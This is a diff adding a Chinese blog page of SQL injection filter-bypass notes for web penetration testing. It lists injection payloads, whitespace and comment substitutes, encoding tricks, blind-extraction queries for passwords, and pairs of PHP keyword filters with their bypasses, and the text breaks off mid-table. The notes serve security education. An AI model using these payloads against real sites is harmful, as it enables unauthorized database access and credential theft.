@@ -1,0 +1,983 @@
+<!DOCTYPE html>
+
+
+
+
+<html class="theme-next gemini" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/3.jpg?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/3.jpg?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/3.jpg?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/3.jpg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Da4er" />
+
+
+
+
+  
+
+
+  <link rel="alternate" href="/atom.xml" title="Da4er's Blogs" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="0x01 数据库特性注释常见的注释符号：1#，--空格，-- -，--+，&#x2F;&#x2F;，&#x2F;**&#x2F;，&#x2F;*任意字符串*&#x2F;，;一般是使用&#x2F;**&#x2F;来绕过过滤空格。12select * from users where id&#x3D;1;select&#x2F;**&#x2F;*&#x2F;**&#x2F;from&#x2F;**&#x2F;users">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL注入绕过笔记(一)">
+<meta property="og:url" content="https://da4er.top/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0-%E4%B8%80.html">
+<meta property="og:site_name" content="Da4er&#39;s Blogs">
+<meta property="og:description" content="0x01 数据库特性注释常见的注释符号：1#，--空格，-- -，--+，&#x2F;&#x2F;，&#x2F;**&#x2F;，&#x2F;*任意字符串*&#x2F;，;一般是使用&#x2F;**&#x2F;来绕过过滤空格。12select * from users where id&#x3D;1;select&#x2F;**&#x2F;*&#x2F;**&#x2F;from&#x2F;**&#x2F;users">
+<meta property="og:image" content="https://da4er.top/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0-%E4%B8%80/1.png">
+<meta property="og:image" content="https://da4er.top/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0-%E4%B8%80/2.png">
+<meta property="og:image" content="https://da4er.top/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0-%E4%B8%80/3.png">
+<meta property="og:image" content="https://da4er.top/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0-%E4%B8%80/4.png">
+<meta property="og:image" content="https://da4er.top/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0-%E4%B8%80/5.png">
+<meta property="og:image" content="https://da4er.top/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0-%E4%B8%80/6.png">
+<meta property="og:image" content="https://da4er.top/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0-%E4%B8%80/7.png">
+<meta property="og:image" content="https://da4er.top/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0-%E4%B8%80/8.png">
+<meta property="og:image" content="https://da4er.top/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0-%E4%B8%80/9.png">
+<meta property="article:published_time" content="2020-02-25T07:46:56.000Z">
+<meta property="article:modified_time" content="2020-02-25T07:49:17.150Z">
+<meta property="article:author" content="Da4er&#39;s">
+<meta property="article:tag" content="Da4er">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://da4er.top/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0-%E4%B8%80/1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://da4er.top/SQL注入绕过笔记-一.html"/>
+
+
+
+
+
+  <title>SQL注入绕过笔记(一) | Da4er's Blogs</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Da4er's Blogs</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <h1 class="site-subtitle" itemprop="description">学而专，专而精。</h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            全部文章
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://da4er.top/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0-%E4%B8%80.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Da4er's">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/3.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Da4er's Blogs">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">SQL注入绕过笔记(一)</h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-25T15:46:56+08:00">
+                2020-02-25
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Web%E5%AE%89%E5%85%A8-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index">
+                    <span itemprop="name">Web安全&渗透测试</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0-%E4%B8%80.html" class="leancloud_visitors" data-flag-title="SQL注入绕过笔记(一)">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  2.3k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  10
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p><script type="text/javascript" src="/js/src/bai.js"></script></p>
+<h3 id="0x01-数据库特性"><a href="#0x01-数据库特性" class="headerlink" title="0x01 数据库特性"></a>0x01 数据库特性</h3><h4 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h4><p>常见的注释符号：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#，--空格，-- -，--+，&#x2F;&#x2F;，&#x2F;**&#x2F;，&#x2F;*任意字符串*&#x2F;，;</span><br></pre></td></tr></table></figure><br>一般是使用/**/来绕过过滤空格。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id&#x3D;1;</span><br><span class="line">select&#x2F;**&#x2F;*&#x2F;**&#x2F;from&#x2F;**&#x2F;users&#x2F;*111*&#x2F;where&#x2F;**&#x2F;id&#x3D;1;</span><br></pre></td></tr></table></figure><br>上面两条语句执行结果是一样的。<br><img src="/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0-%E4%B8%80/1.png" class title="This is an test image"><br>需要注意的是：虽然#，–空格 – - –+都是注释符，但是在不同网站对它们的解析不同。<br><img src="/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0-%E4%B8%80/2.png" class title="This is an test image"><br>这个时候就需要我们多加测试，看看哪种注释符可以被网站的数据库解析执行。</p>
+<p>这里来了个知识点：怎么绕过过滤空格加注释符的sql注入？<br>payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,4&#x2F;**&#x2F;or&#x2F;**&#x2F;&#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure><br>我们可以使用/**/ 块注释或者一些url编码的特殊字符(%09,%0a,%0b,%0c,%0d,%20,%a0 )来替换空格，用or ‘1’=’1的方式闭合后面的引号，这样就可以绕过空格加注释过滤的sql注入。</p>
+<p><strong>在本地测试的时候不能直接把%09等特殊字符放到sql语句中，必须经过url解码。</strong></p>
+<p>其他可以代替空格的方法：<br><strong>浮点数代替空格</strong><br><img src="/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0-%E4%B8%80/3.png" class title="This is an test image"><br><strong>科学计数法代替空格</strong><br><img src="/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0-%E4%B8%80/4.png" class title="This is an test image"><br><strong>括号绕过()</strong><br>在进行空格的时候需要注意：不是所有的语句都支持括号代替空格的。<br><img src="/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0-%E4%B8%80/5.png" class title="This is an test image"><br><strong>所以进行括号绕过时，需要在本地测试看语句是否支持括号。</strong><br><strong>加号减号绕过(+,-)</strong><br>进行绕过时最后将+和-进行url编码。<br>和括号绕过一样，对于有些语句是不支持的。<br><img src="/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0-%E4%B8%80/6.png" class title="This is an test image"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#96; &#96;号绕过</span><br><span class="line">select * from&#96;users&#96;;</span><br></pre></td></tr></table></figure>
+<img src="/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0-%E4%B8%80/7.png" class title="This is an test image">
+<p>同上面一样对于一些语句也是不支持。</p>
+<p><strong>~,!,@,+,-,””,’’,{}等特殊字符绕过空格。</strong><br>这些绕过过滤的空格的字符，在一些语句都是不支持的，需要在本地经过测试才行。</p>
+<hr>
+<h4 id="sql函数和关键字"><a href="#sql函数和关键字" class="headerlink" title="sql函数和关键字"></a>sql函数和关键字</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">MySQL：</span><br><span class="line">union distinct</span><br><span class="line">union distinctrow</span><br><span class="line">procedure analyse()</span><br><span class="line">updatexml()</span><br><span class="line">extracavalue()</span><br><span class="line">exp()</span><br><span class="line">ceil()</span><br><span class="line">atan()</span><br><span class="line">sqrt()</span><br><span class="line">floor()</span><br><span class="line">ceiling()</span><br><span class="line">tan()</span><br><span class="line">rand()</span><br><span class="line">sign()</span><br><span class="line">greatest()</span><br><span class="line">字符串截取函数</span><br><span class="line">Mid(version(),1,1)</span><br><span class="line">Substr(version(),1,1)</span><br><span class="line">Substring(version(),1,1)</span><br><span class="line">Lpad(version(),1,1)</span><br><span class="line">Rpad(version(),1,1)</span><br><span class="line">Left(version(),1)</span><br><span class="line">reverse(right(reverse(version()),1)</span><br><span class="line">字符串连接函数</span><br><span class="line">concat(version(),&#39;|&#39;,user());</span><br><span class="line">concat_ws(&#39;|&#39;,1,2,3)</span><br><span class="line">字符转换</span><br><span class="line">Char(49)</span><br><span class="line">Hex(&#39;a&#39;)</span><br><span class="line">Unhex(61)</span><br><span class="line">过滤了逗号</span><br><span class="line">(1)limit处的逗号：</span><br><span class="line">limit 1 offset 0</span><br><span class="line">(2)字符串截取处的逗号</span><br><span class="line">mid处的逗号：</span><br><span class="line">mid(version() from 1 for 1)</span><br><span class="line">MSSQL：</span><br><span class="line">IS_SRVROLEMEMBER()</span><br><span class="line">IS_MEMBER()</span><br><span class="line">HAS_DBACCESS()</span><br><span class="line">convert()</span><br><span class="line">col_name()</span><br><span class="line">object_id()</span><br><span class="line">is_srvrolemember()</span><br><span class="line">is_member()</span><br><span class="line">字符串截取函数</span><br><span class="line">Substring(@@version,1,1)</span><br><span class="line">Left(@@version,1)</span><br><span class="line">Right(@@version,1)</span><br><span class="line">(2)字符串转换函数</span><br><span class="line">Ascii(&#39;a&#39;) 这里的函数可以在括号之间添加空格的，一些waf过滤不严会导致bypass</span><br><span class="line">Char(&#39;97&#39;)</span><br><span class="line">exec</span><br></pre></td></tr></table></figure>
+<hr>
+<h3 id="0x02-绕过过滤"><a href="#0x02-绕过过滤" class="headerlink" title="0x02 绕过过滤"></a>0x02 绕过过滤</h3><h4 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h4><p>数据库对大小写不敏感，如果后台代码只过滤的小写的关键字，我们可以通过大小写混合来绕过。<br><img src="/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0-%E4%B8%80/8.png" class title="This is an test image"></p>
+<h4 id="内联注释"><a href="#内联注释" class="headerlink" title="内联注释"></a>内联注释</h4><p>这个mysql才有的特性:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*!关键字*&#x2F;</span><br></pre></td></tr></table></figure><br>上面的代码会没数据库解析执行为sql语句。<br><img src="/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0-%E4%B8%80/9.png" class title="This is an test image"></p>
+<h4 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h4><p>1.URL编码<br>在Chrome中输入一个连接，非保留字的字符浏览器会对其URL编码，如空格变为%20、单引号%27、左括号%28、右括号%29普通的URL编码可能无法实现绕过，还存在一种情况URL编码只进行了一次过滤，可以用两次编码绕过：page.php?id=1%252f%252a*/UNION%252f%252a /SELECT<br>2.十六进制编码<br>常用的是对参数进行十六进制编码，对一些关键字最好不用编码。<br>3.Unicode编码<br>Unicode有所谓的标准编码和非标准编码，假设我们用的utf-8为标准编码，那么西欧语系所使用的就是非标准编码了看一下常用的几个符号的一些Unicode编码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">单引号: %u0027、%u02b9、%u02bc%u02c8、%u2032、%uff07、%c0%27、%c0%a7、%e0%80%a7</span><br><span class="line"></span><br><span class="line">空格：%u0020、%uff00、%c0%20、%c0%a0、%e0%80%a0</span><br><span class="line"></span><br><span class="line">左括号：%u0028、%uff08、%c0%28、%c0%a8、%e0%80%a8</span><br><span class="line"></span><br><span class="line">右括号：%u0029、%uff09、%c0%29、%c0%a9、%e0%80%a9</span><br></pre></td></tr></table></figure></p>
+<h4 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h4><p>%20 %09 %0a %0b %0c %0d %a0 /**/  这些都可以替换空格。</p>
+<p><strong>当这些字符都被过滤时，我们可以使用括号将子查询包含起来:任何可以计算出结果的语句，都可以用括号包围起来。</strong></p>
+<h4 id="等价函数绕过"><a href="#等价函数绕过" class="headerlink" title="等价函数绕过"></a>等价函数绕过</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">hex()、bin()，ord() &#x3D;&#x3D;&gt; ascii()</span><br><span class="line"></span><br><span class="line">sleep() &#x3D;&#x3D;&gt;benchmark()</span><br><span class="line"></span><br><span class="line">concat_ws()&#x3D;&#x3D;&gt;group_concat()</span><br><span class="line"></span><br><span class="line">mid()、substr() &#x3D;&#x3D;&gt; substring()</span><br><span class="line"></span><br><span class="line">@@user &#x3D;&#x3D;&gt; user()</span><br><span class="line"></span><br><span class="line">@@datadir &#x3D;&#x3D;&gt; datadir()</span><br><span class="line"></span><br><span class="line">举例：substring()和substr()无法使用时：?id&#x3D;1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))&#x3D;74　</span><br><span class="line"></span><br><span class="line">或者：</span><br><span class="line">substr((select &#39;password&#39;),1,1) &#x3D; 0x70</span><br><span class="line">strcmp(left(&#39;password&#39;,1), 0x69) &#x3D; 1</span><br><span class="line">strcmp(left(&#39;password&#39;,1), 0x70) &#x3D; 0</span><br><span class="line">strcmp(left(&#39;password&#39;,1), 0x71) &#x3D; -1</span><br></pre></td></tr></table></figure>
+<h4 id="特殊函数绕过"><a href="#特殊函数绕过" class="headerlink" title="特殊函数绕过"></a>特殊函数绕过</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">1. 通过greatest函数绕过不能使用大小于符号的情况</span><br><span class="line"></span><br><span class="line">greatest(a,b)，返回a和b中较大的那个数。</span><br><span class="line">当我们要猜解user()第一个字符的ascii码是否小于等于150时，可使用：</span><br><span class="line">mysql&gt; select greatest(ascii(mid(user(),1,1)),150)&#x3D;150;</span><br><span class="line"> +------------------------------------------+</span><br><span class="line">| greatest(ascii(mid(user(),1,1)),150)&#x3D;150 |</span><br><span class="line"> +------------------------------------------+</span><br><span class="line">|                                        1 |</span><br><span class="line"> +------------------------------------------+</span><br><span class="line">如果小于150，则上述返回值为True。</span><br><span class="line"></span><br><span class="line">2. 通过substr函数绕过不能使用逗号的情况</span><br><span class="line"></span><br><span class="line">mid(user() from 1 for 1)</span><br><span class="line">或</span><br><span class="line">substr(user() from 1 for 1)</span><br><span class="line"></span><br><span class="line">mysql&gt; select ascii(substr(user() from 1 for 1)) &lt; 150;</span><br><span class="line"> +------------------------------------------+</span><br><span class="line">| ascii(substr(user() from 1 for 1)) &lt; 150 |</span><br><span class="line"> +------------------------------------------+</span><br><span class="line">|                                        1 |</span><br><span class="line"> +------------------------------------------+</span><br><span class="line"></span><br><span class="line">3.使用数学运算函数在子查询中报错</span><br><span class="line"></span><br><span class="line">exp(x)函数的作用： 取常数e的x次方，其中，e是自然对数的底。</span><br><span class="line"></span><br><span class="line">~x 是一个一元运算符，将x按位取补</span><br><span class="line"></span><br><span class="line">select exp(~(select*from(select user())a))</span><br><span class="line">mysql报错：</span><br><span class="line">mysql&gt; select exp(~(select*from(select user())a));</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in ‘exp(~((select ‘root@localhost’ from dual)))’</span><br><span class="line"></span><br><span class="line">这条查询会出错，是因为exp(x)的参数x过大，超过了数值范围，分解到子查询，就是：</span><br><span class="line"></span><br><span class="line">(select*from(select user())a) 得到字符串 root@localhost</span><br><span class="line"></span><br><span class="line">表达式’root@localhost’被转换为0，按位取补之后得到一个非常的大数，它是MySQL中最大的无符号整数</span><br></pre></td></tr></table></figure>
+<h4 id="PHP一些常见的过滤方法及绕过方式"><a href="#PHP一些常见的过滤方法及绕过方式" class="headerlink" title="PHP一些常见的过滤方法及绕过方式"></a>PHP一些常见的过滤方法及绕过方式</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">过滤关键字    and or</span><br><span class="line">php代码    preg_match(&#39;&#x2F;(and|or)&#x2F;i&#39;,$id)</span><br><span class="line">会过滤的攻击代码    1 or 1&#x3D;1 1 and 1&#x3D;1</span><br><span class="line">绕过方式    1 || 1&#x3D;1 1 &amp;&amp; 1&#x3D;1</span><br><span class="line"></span><br><span class="line">过滤关键字    and or union</span><br><span class="line">php代码    preg_match(&#39;&#x2F;(and|or|union)&#x2F;i&#39;,$id)</span><br><span class="line">会过滤的攻击代码    union select user,password from users</span><br><span class="line">绕过方式    1 &amp;&amp; (select user from users where userid&#x3D;1)&#x3D;&#39;admin&#39;</span><br><span class="line"></span><br><span class="line">过滤关键字    and or union where</span><br><span class="line">php代码    preg_match(&#39;&#x2F;(and|or|union|where)&#x2F;i&#39;,$id)</span><br><span class="line">会过滤的攻击代码    1 &amp;&amp; (select user from users where user_id &#x3D; 1) &#x3D; &#39;admin&#39;</span><br><span class="line">绕过方式    1 &amp;&amp; (select user from users limit 1) &#x3D; &#39;admin&#39;</span><br><span class="line"></span><br><span class="line">过滤关键字    and or union where</span><br><span class="line">php代码    preg_match(&#39;&#x2F;(and|or|union|where)&#x2F;i&#39;,$id)</span><br><span class="line">会过滤的攻击代码    1 &amp;&amp; (select user from users where user_id &#x3D; 1) &#x3D; &#39;admin&#39;</span><br><span class="line">绕过方式    1 &amp;&amp; (select user from users limit 1) &#x3D; &#39;admin&#39;</span><br><span class="line"></span><br><span class="line">过滤关键字    and, or, union, where, limit</span><br><span class="line">php代码    preg_match(&#39;&#x2F;(and|or|union|where|limit)&#x2F;i&#39;, $id)</span><br><span class="line">会过滤的攻击代码    1 &amp;&amp; (select user from users limit 1) &#x3D; &#39;admin&#39;</span><br><span class="line">绕过方式    1 &amp;&amp; (select user from users group by user_id having user_id &#x3D; 1) &#x3D; &#39;admin&#39;#user_id聚合中user_id为1的user为admin</span><br><span class="line"></span><br><span class="line">过滤关键字    and, or, union, where, limit, group by</span><br><span class="line">php代码    preg_match(&#39;&#x2F;(and|or|union|where|limit|group by)&#x2F;i&#39;, $id)</span><br><span class="line">会过滤的攻击代码    1 &amp;&amp; (select user from users group by user_id having user_id &#x3D; 1) &#x3D; &#39;admin&#39;</span><br><span class="line">绕过方式    1 &amp;&amp; (select substr(group_concat(user_id),1,1) user from users ) &#x3D; 1</span><br><span class="line"></span><br><span class="line">过滤关键字    and, or, union, where, limit, group by, select</span><br><span class="line">php代码    preg_match(&#39;&#x2F;(and|or|union|where|limit|group by|select)&#x2F;i&#39;, $id)</span><br><span class="line">会过滤的攻击代码    1 &amp;&amp; (select substr(gruop_concat(user_id),1,1) user from users) 